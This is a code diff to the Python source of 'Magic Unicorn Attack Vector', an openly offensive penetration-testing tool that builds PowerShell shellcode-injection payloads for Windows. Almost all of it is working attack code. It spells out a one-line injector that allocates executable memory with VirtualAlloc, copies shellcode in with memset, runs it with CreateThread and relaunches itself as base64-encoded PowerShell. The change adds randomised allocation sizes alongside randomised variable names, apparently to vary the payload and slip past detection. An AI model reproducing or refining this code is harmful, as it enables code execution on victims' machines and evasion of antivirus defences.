@@ -45,6 +45,11 @@ def generate_random_string(low, high):
     letters = string.ascii_letters  # + string.digits
     return ''.join([random.choice(letters) for _ in range(length)])
 
+
+# generate a random number based on range
+def generate_random_number(low, high):
+    for x in range(1): return random.randint(low,high)
+
 # needed for color in unicorn eyes
 class ColorsEnum:
     CYAN = '\033[96m'
@@ -261,7 +266,7 @@ The last one will use a 500 character string instead of the default 380, resulti
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v2.11 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v2.12 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -555,15 +560,16 @@ def gen_shellcode_attack(payload, ipaddr, port):
     var9 = "$" + generate_random_string(2, 2) # $g
     var10 = "$" + generate_random_string(2, 2) # $i
     var11 = "$" + generate_random_string(2, 2) # $w
+    var12 = (str(generate_random_number(1001,1020)))
 
     # one line shellcode injection with native x86 shellcode
-    powershell_code = (r"""$1 = '$t = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $t -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;){Start-Sleep 60};';$h = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-ec ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $h"}else{;iex "& powershell $2 $h";}""" % (shellcode))
+    powershell_code = (r"""$1 = '$t = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $t -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x$randstack;if ($z.Length -gt 0x$randstack){$g = $z.Length};$x=$w::VirtualAlloc(0,0x$randstack,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;){Start-Sleep 60};';$h = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-ec ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $h"}else{;iex "& powershell $2 $h";}""" % (shellcode))
 
     # run it through a lame var replace
     powershell_code = powershell_code.replace("$1", var1).replace("$c", var2).replace(
         "$2", var3).replace("$3", var4).replace("$x", var5).replace("$t", var6).replace(
         "$h", var7).replace("$z", var8).replace("$g", var9).replace("$i", var10).replace(
-        "$w", var11)
+        "$w", var11).replace("$randstack", var12)
 
     return powershell_code
 
